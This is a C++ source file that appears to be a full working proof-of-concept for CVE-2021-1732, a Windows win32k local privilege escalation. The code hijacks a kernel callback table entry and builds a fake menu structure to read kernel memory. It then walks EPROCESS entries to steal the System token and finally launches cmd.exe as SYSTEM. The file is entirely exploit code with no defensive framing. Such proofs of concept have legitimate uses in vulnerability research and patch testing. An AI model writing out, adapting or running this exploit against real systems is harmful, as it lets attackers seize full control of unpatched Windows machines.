// CVE-2021-1732.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include "CVE-2021-1732.h"

WNDCLASSEX normal_wc = { };
const WCHAR NORMAL_CLSNAME[] = L"normalClass";
const WCHAR NORMAL_WNDNAME[] = L"normalWindow";
HMENU* hmenuNormal = new HMENU[NORMAL_WINDOW_NUMBER];
HWND* hwndNormal = new HWND[NORMAL_WINDOW_NUMBER];
PTHRDESKHEAD* uTagWND = new PTHRDESKHEAD[NORMAL_WINDOW_NUMBER];
ULONG uTagWNDOffset[NORMAL_WINDOW_NUMBER];
ULONG uTagWND0cbWndExtra;

WNDCLASSEX magic_wc = { };
const WCHAR MAGIC_CLSNAME[] = L"magicClass";
const WCHAR MAGIC_WNDNAME[] = L"MagicWindow";
HWND hwndMagic;
PTHRDESKHEAD uMagicTagWND;
ULONGLONG hwndMagicOrigOffset = NULL;
ULONG hwndMagicExtraOffset = NULL;

_HMValidateHandle pHmValidateHandle = NULL;
_OrigxxxClientAllocWindowClassExtraBytes pOrigxxxClientAllocWindowClassExtraBytes = NULL;
_NtUserConsoleControl pNtUserConsoleControl = NULL;
_NtCallbackReturn pNtCallbackReturn = NULL;

BOOL Trigger = FALSE;

ULONGLONG uTagWND0pExtraBytesROffset;
ULONGLONG uTagWND0pExtraBytes;
ULONGLONG uTagWND1pdwStyle;
ULONGLONG uTagWND1OlddwStyle;
ULONGLONG uTagWND1dwStyleIndex;
ULONGLONG uTagWND1pspmenu;
ULONGLONG uTagWND1Oldspmenu;
ULONGLONG uTagWND1spmenuIndex;
ULONGLONG uTagWND1ppExtraBytesOffset;
ULONGLONG uTagWND1OldpExtraBytes;
ULONGLONG uTagWND1EBOverwriteIndex;

//Leak
ULONGLONG kTagWNDObjectLeak;
ULONGLONG kTagWNDObject;
ULONGLONG kUnknown1Leak;
ULONGLONG kUnknown1;
ULONGLONG kUnknown2;
ULONGLONG kThreadLeak;
ULONGLONG kThread;
ULONGLONG LPeProcess;
ULONGLONG NeProcess;
ULONGLONG UniqueProcessId;
ULONGLONG ActiveProcessLinks;
ULONGLONG Token;
ULONGLONG OrigToken;
ULONGLONG kDesktopHeap;

LRESULT CALLBACK NormalWinProc(HWND hwnd, UINT wm, WPARAM wp, LPARAM lp)
{
    return DefWindowProc(hwnd, wm, wp, lp);
}

BOOL FindHMValidateHandle()
{
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32)
    {
        printf("[!] Error while loading user32.dll: %d\n", GetLastError());
        return FALSE;
    }

    BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
    if (!pIsMenu)
    {
        printf("[!] Error getting IsMenu address: %d\n", GetLastError());
        return FALSE;
    }

    ULONG HMValidateHandleOffset = 0;
    for (ULONG i = 0; i < 0x100; i++)
    {
        BYTE* isMenuOpcode = pIsMenu + i;
        if (*isMenuOpcode == 0xe8)
        {
            HMValidateHandleOffset = i + 1;
            break;
        }
    }
    if (HMValidateHandleOffset == 0)
    {
        printf("[!] Error finding the offset to HMValidateHandle call from IsMenu\n");
        return FALSE;
    }

    ULONG relative_offset = *(PULONG)(pIsMenu + HMValidateHandleOffset);
    ULONGLONG offset = ((ULONGLONG)pIsMenu + HMValidateHandleOffset - (ULONGLONG)hUser32 + 0x04 + relative_offset) & 0x00000000ffffffff;
    pHmValidateHandle = (_HMValidateHandle)((ULONGLONG)hUser32 + offset);

    printf("[>] Relative offset to HMValidateHandle: %lx\n", relative_offset);
    printf("[>] Offset to HMValidateHandle: %llx\n", offset);
    printf("[>] VMA of HMValidateHandle: %llx\n", (ULONGLONG)pHmValidateHandle);
    return TRUE;
}

void* WINAPI MyxxxClientAllocWindowClassExtraBytes(ULONG* size)
{
    do
    {
        if (MAGIC_CBWNDEXTRA == *size)
        {
            hwndMagic = NULL;
            //int z = 0;
            for (int i = 2; i < NORMAL_WINDOW_NUMBER; ++i)
            {
                ULONG_PTR cbWndExtra = *(ULONG_PTR*)((ULONG_PTR)uTagWND[i] + WND_CBWNDEXTRA_OFFSET);
                if (MAGIC_CBWNDEXTRA == cbWndExtra)
                {
                    uMagicTagWND = uTagWND[i];
                    hwndMagic = (HWND) * (ULONG_PTR*)(uMagicTagWND);
                    //z = i;
                    Trigger = TRUE;
                    printf("[+] Found &hwndMagic at: %p\n", uMagicTagWND);
                    break;
                }
            }
            if (!hwndMagic)
            {
                printf("[!] Error while finding hwndMagic\n");
                break;
            }

            //DebugBreak();
            CONSOLEWINDOWOWNER magicConsoleOwner = { 0 };
            magicConsoleOwner.hwnd = hwndMagic;
            magicConsoleOwner.ProcessId = GetCurrentProcessId();
            magicConsoleOwner.ThreadId = GetCurrentThreadId();
            pNtUserConsoleControl(ConsoleAcquireDisplayOwnership, &magicConsoleOwner, sizeof(magicConsoleOwner));

            hwndMagicOrigOffset = (ULONGLONG) * ((ULONG_PTR*)((ULONGLONG)uMagicTagWND + 0x128));
            hwndMagicExtraOffset = uTagWNDOffset[0] + 0xc8; // Offset to TagWND[0].cbWndExtra
            printf("[+] Original uMagicTagWND pExtraBytes offset: %llx\n", hwndMagicOrigOffset);

            struct {
                ULONG_PTR retvalue;
                ULONG_PTR unused1;
                ULONG_PTR unused2;
            } result = { 0 };
            //result.retvalue = 0xffffff00;
            result.retvalue = hwndMagicExtraOffset;
            pNtCallbackReturn(&result, sizeof(result), 0);
        }
    } while (FALSE);
    return pOrigxxxClientAllocWindowClassExtraBytes(size);
}

int main()
{
    if (!FindHMValidateHandle())
    {
        printf("[!] Error while resolving HMValidateHandle\n");
        return 1;
    }

    // NTDLL & win32k stuff (put in function)
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll)
    {
        printf("[!] Error while loading ntdll.dll: %d\n", GetLastError());
        return 1;
    }

    HMODULE hwin32u = LoadLibraryA("win32u.dll");
    if (!hwin32u)
    {
        printf("[!] Error while loading win32u.dll: %d\n", GetLastError());
        return 1;
    }

    pNtUserConsoleControl = (_NtUserConsoleControl)GetProcAddress(hwin32u, "NtUserConsoleControl");
    if (!pNtUserConsoleControl)
    {
        printf("[!] Error while resolving NtUserConsoleControl: %d\n", GetLastError());
        return 1;
    }

    pNtCallbackReturn = (_NtCallbackReturn)GetProcAddress(hNtdll, "NtCallbackReturn");
    if (!pNtCallbackReturn)
    {
        printf("[!] Error while resolving NtCallbackReturn: %d\n", GetLastError());
        return 1;
    }
    // NTDLL & win32k stuff

    normal_wc.cbSize = sizeof(WNDCLASSEX);
    normal_wc.style = CS_VREDRAW | CS_HREDRAW;
    normal_wc.lpfnWndProc = NormalWinProc;
    normal_wc.cbClsExtra = 0;
    normal_wc.cbWndExtra = NORMAL_CBWNDEXTRA;
    normal_wc.hInstance = GetModuleHandle(NULL);
    normal_wc.lpszClassName = NORMAL_CLSNAME;
    if (!RegisterClassEx(&normal_wc))
    {
        printf("[!] Error while registering the normal class: %d\n", GetLastError());
        return 1;
    }

    magic_wc.cbSize = sizeof(WNDCLASSEX);
    magic_wc.style = CS_VREDRAW | CS_HREDRAW;
    magic_wc.lpfnWndProc = NormalWinProc;
    magic_wc.cbClsExtra = 0;
    magic_wc.cbWndExtra = MAGIC_CBWNDEXTRA;
    magic_wc.hInstance = GetModuleHandle(NULL);
    magic_wc.lpszClassName = MAGIC_CLSNAME;
    if (!RegisterClassEx(&magic_wc))
    {
        printf("[!] Error while registering the normal class: %d\n", GetLastError());
        return 1;
    }

    hmenuNormal[0] = CreateMenu();
    hwndNormal[0] = CreateWindowEx(WS_EX_NOACTIVATE, NORMAL_CLSNAME, NORMAL_WNDNAME, WS_DISABLED, 0, 0, 0, 0, NULL, hmenuNormal[0], GetModuleHandle(NULL), NULL);
    CONSOLEWINDOWOWNER normalConsoleOwner = { 0 };
    normalConsoleOwner.hwnd = hwndNormal[0];
    normalConsoleOwner.ProcessId = GetCurrentProcessId();
    normalConsoleOwner.ThreadId = GetCurrentThreadId();
    pNtUserConsoleControl(ConsoleAcquireDisplayOwnership, &normalConsoleOwner, sizeof(normalConsoleOwner));
    Sleep(100);

    for (DWORD i = 1; i < NORMAL_WINDOW_NUMBER; i++)
    {
        hmenuNormal[i] = CreateMenu();
        hwndNormal[i] = CreateWindowEx(WS_EX_NOACTIVATE, NORMAL_CLSNAME, NORMAL_WNDNAME, WS_DISABLED, 0, 0, 0, 0, NULL, hmenuNormal[i], GetModuleHandle(NULL), NULL);
    }

    for (DWORD i = 0; i < NORMAL_WINDOW_NUMBER; i++)
    {
        uTagWND[i] = (PTHRDESKHEAD)pHmValidateHandle(hwndNormal[i], TYPE_WINDOW);
        uTagWNDOffset[i] = uTagWND[i]->thobjh.h.cLockObj;
        printf("[>] Usermode TagWND object %d allocated at: %p\n", i, uTagWND[i]);
        printf("[>] Usermode TagWND %d offset is: %lx\n", i, uTagWND[i]->thobjh.h.cLockObj);
    }

    // Usermode Callback stuff 
    PTEB pTEB = NtCurrentTeb();
    if (!pTEB)
    {
        printf("[!] Error while getting the TEB\n");
        return 1;
    }

    PPEB pPEB = pTEB->ProcessEnvironmentBlock;
    PKERNELCALLBACKTABLE kcallbacktable = (PKERNELCALLBACKTABLE)pPEB->KernelCallbackTable;
    pOrigxxxClientAllocWindowClassExtraBytes = (_OrigxxxClientAllocWindowClassExtraBytes)kcallbacktable->__xxxClientAllocWindowClassExtraBytes;
    printf("[+] Current TEB address: %p\n", pTEB);
    printf("[+] Current PEB address: %p\n", pPEB);
    printf("[+] Address of KernelCallbackTable: %p\n", kcallbacktable);
    printf("[+] Address of __xxxClientAllocWindowClassExtraBytes: %llx\n", kcallbacktable->__xxxClientAllocWindowClassExtraBytes);

    DWORD lpflOldProtect;
    if (!VirtualProtect(kcallbacktable, sizeof(KERNELCALLBACKTABLE), PAGE_READWRITE, &lpflOldProtect))
    {
        printf("[!] Error while calling VirtualProtect: %d\n", GetLastError());
        return 1;
    }

    kcallbacktable->__xxxClientAllocWindowClassExtraBytes = (ULONG_PTR)&MyxxxClientAllocWindowClassExtraBytes;
    if (kcallbacktable->__xxxClientAllocWindowClassExtraBytes == (ULONG_PTR)pOrigxxxClientAllocWindowClassExtraBytes)
    {
        printf("[!] Error while overwritting the __xxxClientAllocWindowClassExtraBytes callback\n");
        return 1;
    }
    printf("[+] __xxxClientAllocWindowClassExtraBytes successfully overwritten with: %llx\n", kcallbacktable->__xxxClientAllocWindowClassExtraBytes);
    // Usermode Callback stuff

    ULONGLONG udesktopHeapBase = (ULONGLONG)uTagWND[0] - uTagWND[0]->thobjh.h.cLockObj;
    uTagWND0pExtraBytesROffset = (ULONGLONG) * ((ULONG_PTR*)((ULONGLONG)uTagWND[0] + 0x128));
    uTagWND0pExtraBytes = udesktopHeapBase + uTagWND0pExtraBytesROffset;
    uTagWND1pdwStyle = (ULONGLONG)uTagWND[1] + 0x18;
    uTagWND1pspmenu = (ULONGLONG)uTagWND[1] + 0x98;
    uTagWND1ppExtraBytesOffset = (ULONGLONG)uTagWND[1] + 0x128;
    uTagWND1dwStyleIndex = uTagWND1pdwStyle - uTagWND0pExtraBytes;
    uTagWND1spmenuIndex = uTagWND1pspmenu - uTagWND0pExtraBytes;
    uTagWND1EBOverwriteIndex = uTagWND1ppExtraBytesOffset - uTagWND0pExtraBytes;
    printf("[+] Desktop Heap uBase Address: %llx\n", udesktopHeapBase);
    printf("[+] TagWND[0] dwStyle overwrite index: %llx\n", uTagWND1dwStyleIndex);
    printf("[+] TagWND[0] spmenu overwrite index: %llx\n", uTagWND1spmenuIndex);
    printf("[+] TagWND[0] pExtraBytes overwrite index: %llx\n", uTagWND1EBOverwriteIndex);

    if (uTagWND1EBOverwriteIndex >= 0x0fffffff)
    {
        exit(0);
    }

    LPVOID fakespmenu = VirtualAlloc((LPVOID)0x00000001a0000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (fakespmenu == NULL)
    {
        printf("[!] Error while allocating memory for the input buffer: %d\n", GetLastError());
        return 1;
    }
    memset(fakespmenu, 0x00, 0x1000);
    ((PDWORD64)((DWORD64)fakespmenu + 0x98))[0] = 0x00000001a0000200;
    ((PDWORD64)((DWORD64)fakespmenu + 0x200))[0] = 0x00000001a0000300;
    ((PDWORD64)((DWORD64)fakespmenu + 0x208))[0] = 0x0000000000000010;
    ((PDWORD)((DWORD64)fakespmenu + 0x300))[0] = 0x88888888;
    ((PDWORD64)((DWORD64)fakespmenu + 0x328))[0] = 0x00000001a0000400;
    ((PDWORD64)((DWORD64)fakespmenu + 0x340))[0] = 0x0000000100000001;
    ((PDWORD64)((DWORD64)fakespmenu + 0x358))[0] = 0x00000001a0000500;
    ((PDWORD64)((DWORD64)fakespmenu + 0x428))[0] = 0x0000001000000000;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = 0x0000000000000000; // Read from here

    getchar();
    for (DWORD i = 2; i < NORMAL_WINDOW_NUMBER; i++)
    {
        DestroyWindow(hwndNormal[i]);
    }
    CreateWindowEx(WS_EX_NOACTIVATE, MAGIC_CLSNAME, MAGIC_WNDNAME, WS_DISABLED, 0, 0, 0, 0, NULL, NULL, GetModuleHandle(NULL), NULL);

    if (!Trigger)
    {
        exit(0);
    }

    printf("[+] Overwriting cbWndExtra of TagWND[0]\n");
    uTagWND0cbWndExtra = SetWindowLong(hwndMagic, 0x0, 0x0fffffff);
    printf("[+] Changing TagWND[1] dwStyle to WS_CHILD\n");
    uTagWND1OlddwStyle = SetWindowLongPtr((HWND)uTagWND[0]->thobjh.h.hwndh, (int)uTagWND1dwStyleIndex, 0x4cc0000008000100);
    printf("[+] Setting fake spmenu in TagWND[1]\n");
    uTagWND1Oldspmenu = SetWindowLongPtr((HWND)uTagWND[1]->thobjh.h.hwndh, GWLP_ID, 0x00000001a0000000);
    printf("[+] Leaked address: %llx\n", uTagWND1Oldspmenu);
    printf("[+] Restoring TagWND[1] dwStyle to original\n");
    SetWindowLongPtr((HWND)uTagWND[0]->thobjh.h.hwndh, (int)uTagWND1dwStyleIndex, uTagWND1OlddwStyle);

    kTagWNDObjectLeak = uTagWND1Oldspmenu + 0x50 - 0x48;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = kTagWNDObjectLeak;
    MENUBARINFO mbi;
    mbi.cbSize = sizeof(MENUBARINFO);
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    //kTagWNDObject = ((ULONGLONG)mbi.rcBar.bottom << 0x20) + (ULONG)mbi.rcBar.right;
    kTagWNDObject = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    printf("[+] kTagWNDObject Address: %llx\n", kTagWNDObject);
    
    kUnknown1Leak = kTagWNDObject + 0x10 - 0x48;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = kUnknown1Leak;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    //kUnknown1 = ((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) + (ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left;
    kUnknown1 = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    printf("[+] kUnknown1 Address: %llx\n", kUnknown1);

    kThreadLeak = kUnknown1 - 0x48;
    ((PDWORD64)((DWORD64)fakespmenu + 0x208))[0] = 0x0000000000000010;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = kThreadLeak;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    kThread = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    printf("[+] KTHREAD Address: %llx\n", kThread);

    ((PDWORD64)((DWORD64)fakespmenu + 0x208))[0] = 0x0000000000000010;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = kThread + 0x220 - 0x48;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    LPeProcess = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    NeProcess = LPeProcess;
    printf("[+] EPROCESS Address: %llx\n", LPeProcess);

    while (TRUE)
    {
        ((PDWORD64)((DWORD64)fakespmenu + 0x208))[0] = 0x0000000000000010;
        ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = NeProcess + 0x2f0 - 0x48;
        GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
        NeProcess = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
        NeProcess = NeProcess - 0x2f0;

        ((PDWORD64)((DWORD64)fakespmenu + 0x208))[0] = 0x0000000000000010;
        ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = NeProcess + 0x2e8 - 0x48;
        GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
        UniqueProcessId = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);

        if (UniqueProcessId == 0x0000000000000004)
        {
            printf("[+] System EPROCESS detected\n");
            break;
        }
    }

    ((PDWORD64)((DWORD64)fakespmenu + 0x208))[0] = 0x0000000000000010;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = NeProcess + 0x360 - 0x48;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    Token = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    uTagWND1OldpExtraBytes = SetWindowLongPtr((HWND)uTagWND[0]->thobjh.h.hwndh, (int)uTagWND1EBOverwriteIndex, (ULONGLONG)(LPeProcess + 0x360));
    OrigToken = SetWindowLongPtr((HWND)uTagWND[1]->thobjh.h.hwndh, 0, Token);

    // Restore
    // Restore Order: Use the read primitive to get the Kernel Desktop Heap Base, Use TagWND0 to make TagWND1 point to TagWND3 pExtraBytes and restore that. Use TagWND0 to make TagWND1 point to cbWndExtra of TagWND0 and restore that, Swap TagWND1 into offset mode ? Destroy one window at a time.
    //getchar();
    //DebugBreak();
    
    printf("[>] Starting the restore procedure:\n");
    ((PDWORD64)((DWORD64)fakespmenu + 0x208))[0] = 0x0000000000000010;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = kTagWNDObject + 0x18 - 0x48;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    kUnknown2 = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    printf("[+] kUnknown2 Address: %llx\n", kUnknown2);

    ((PDWORD64)((DWORD64)fakespmenu + 0x208))[0] = 0x0000000000000010;
    ((PDWORD64)((DWORD64)fakespmenu + 0x500))[0] = kUnknown2 + 0x80 - 0x48;
    GetMenuBarInfo(hwndNormal[1], OBJID_MENU, 1, &mbi);
    kDesktopHeap = (((ULONGLONG)((ULONG)mbi.rcBar.bottom - (ULONG)mbi.rcBar.top) << 0x20) & 0xffffffff00000000) + (((ULONG)mbi.rcBar.right - (ULONG)mbi.rcBar.left) & 0x00000000ffffffff);
    printf("[+] kDesktopHeap Address: %llx\n", kDesktopHeap);

    SetWindowLongPtr((HWND)uTagWND[0]->thobjh.h.hwndh, (int)uTagWND1EBOverwriteIndex, (ULONGLONG)(kDesktopHeap + (ULONG)uMagicTagWND->thobjh.h.cLockObj + 0x128));
    SetWindowLongPtr((HWND)uTagWND[1]->thobjh.h.hwndh, 0, hwndMagicOrigOffset);
    DestroyWindow(hwndMagic);
    system("start cmd.exe");

    return 0;
}